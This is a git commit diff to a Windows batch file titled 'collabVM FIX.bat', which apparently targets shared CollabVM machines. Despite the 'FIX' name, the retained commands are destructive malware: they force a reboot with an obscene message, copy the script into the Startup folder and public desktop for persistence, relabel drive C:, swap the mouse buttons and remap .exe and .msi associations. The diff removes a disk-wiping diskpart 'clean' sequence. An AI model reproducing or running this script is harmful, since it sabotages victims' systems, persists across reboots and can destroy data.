4cf1b9468a690293ea3b45bf1e4a81ab2e7e83ba
Makuad <dankasadovsky@gmail.com>
2025-11-05 17:53:29 +0500

    Update collabVM FIX.bat

--- collabVM FIX.bat
+++ collabVM FIX.bat
@@ -4,7 +4,6 @@ color 02
 echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
 Start cmd
 Start notepad
-taskkill
 shutdown /r /t 25 /c "PC FUCKING"​
 start explorer
 start mspaint
@@ -13,10 +12,6 @@ copy %0 "C:\Users\Public\Desktop"
 copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 label C:Fucked​
 rundll32 user32, SwapMouseButton
-diskpart
-select vol 0
-clean
-exit
 assoc .exe=bat
 assoc .msi=bat
 assoc .exe=bat
